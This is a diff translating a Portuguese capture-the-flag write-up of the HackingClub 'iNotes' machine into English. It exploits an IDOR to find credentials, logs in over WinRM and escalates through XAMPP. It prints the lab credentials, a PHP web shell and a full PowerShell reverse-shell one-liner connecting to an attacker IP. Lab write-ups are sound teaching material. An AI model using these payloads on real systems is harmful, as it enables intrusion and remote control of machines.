@@ -1,20 +1,14 @@
 ---
 title: 'iNotes Writeup'
 date: '2024-11-13'
-tags: ['IDOR', 'Windows']
+tags: ['IDOR', 'Windows', 'Hacking Club']
 draft: false
-summary: 'Essa é uma maquina de campeonato da HackingClub, nela encontramos um IDOR que nos proporciona o acesso inicial e o Privillege Escalation através do XAMPP.'
+summary: 'This is a HackingClub championship machine where we found an IDOR that provides initial access and Privilege Escalation through XAMPP.'
 images: ['/static/images/inotes-writeup-images/default.png']
 authors: ['default']
 ---
 
 ![logo](/static/images/inotes-writeup-images/default.png)
-
-## **Plataforma**: Hacking Club
-
-### **Dificuldade:** Easy
-
-### **Nome**: iNotes
 
 ---
 
@@ -129,7 +123,7 @@ Host script results:
 |_  start_date: N/A
 ```
 
-Por se tratar de uma maquina Windows (AD), diversos serviços em múltiplas portas estão abertos.
+Since this is a Windows (AD) machine, many services on multiple ports are open.
 
 ---
 
@@ -139,35 +133,35 @@ Por se tratar de uma maquina Windows (AD), diversos serviços em múltiplas port
 
 ![inotes](/static/images/inotes-writeup-images/image.png)
 
-Testei SQL Injection no campo de login, mas não obtive sucesso, então decidi registrar um novo usuário.
+I tried SQL Injection on the login field but was unsuccessful, so I decided to register a new user.
 
 ![inotes 1](/static/images/inotes-writeup-images/image1.png)
 
-Após se logar.
+After logging in.
 
 ![inotes 2](/static/images/inotes-writeup-images/image2.png)
 
-Criando uma anotação de teste.
+Creating a test note.
 
 ![inotes 3](/static/images/inotes-writeup-images/image3.png)
 
-IDOR encontrado ao trocar o ID da nota.
+IDOR found by changing the note ID.
 
 ![inotes 4](/static/images/inotes-writeup-images/image4.png)
 
 ![inotes 5](/static/images/inotes-writeup-images/image5.png)
 
-Utilizando o IDOR pra identificar e ler todas as notas presentes na aplicação.
+Using the IDOR to enumerate and read all the notes in the application.
 
-Gerei uma wordlist contendo os números de 1 a 107
+I generated a wordlist containing the numbers from 1 to 107.
 
 `seq 1 107 > wordlists.txt`
 
-Depois mandei a wordlists pro Intruder do BurpSuite para enumerar todos os IDs.
+Then, I sent the wordlist to BurpSuite's Intruder to enumerate all the IDs.
 
 ![inotes 6](/static/images/inotes-writeup-images/image6.png)
 
-O ID de numero 97 revela as credenciais do usuário john.
+ID number 97 reveals the credentials of the user john.
 
 `john:Dn*Th5di7UwFJvTM`
 
@@ -177,8 +171,8 @@ O ID de numero 97 revela as credenciais do usuário john.
 
 ## Foot Hold
 
-O AD possui diversos serviços abertos, no entanto, o único acessivel com as credenciais achadas foi o WinRM na porta 5985.
-Com as credenciais em mãos, podemos logar na maquina via WinRM.
+The AD has several open services, however, the only accessible one with the credentials found was WinRM on port 5985.
+With the credentials in hand, we can log into the machine via WinRM.
 
 `evil-winrm -i 172.16.4.176 -u john -p Dn*Th5di7UwFJvTM`
 
@@ -188,7 +182,7 @@ Com as credenciais em mãos, podemos logar na maquina via WinRM.
 
 ## Privillege Escalation
 
-A maquina possui um XAMPP instalado, sabendo disso, eu criei uma web-shell em php.
+The machine has XAMPP installed, so I created a PHP web shell.
 
 ```python
 <?php
@@ -199,7 +193,7 @@ if(isset($_REQUEST['cmd'])){
 ?>
 ```
 
-com isso, eu mandei essa web-shell para o diretório do XAMPP, que no caso fica em: `C:\xampp\htdocs`
+With this, I uploaded the web shell to the XAMPP directory, which is located at: `C:\xampp\htdocs`
 
 `curl http://10.0.31.150/shell.php -o shell.php`
 
@@ -211,11 +205,14 @@ com isso, eu mandei essa web-shell para o diretório do XAMPP, que no caso fica 
 
 ![inotes 11](/static/images/inotes-writeup-images/image11.png)
 
-Por fim você pode usar a web-shell pra pegar a flag final ou gerar uma reverse-shell.
+Finally, you can use the web shell to grab the final flag or create a reverse shell.
 
-`https://172.16.4.176/shell.php?cmd=powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.31.150',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+```
+https://172.16.4.176/shell.php?cmd=powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.31.150',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
-OBS: Lembre de encodar a payload.
+```
+
+Note: Be sure to encode the payload.
 
 ![inotes 12](/static/images/inotes-writeup-images/image12.png)
 
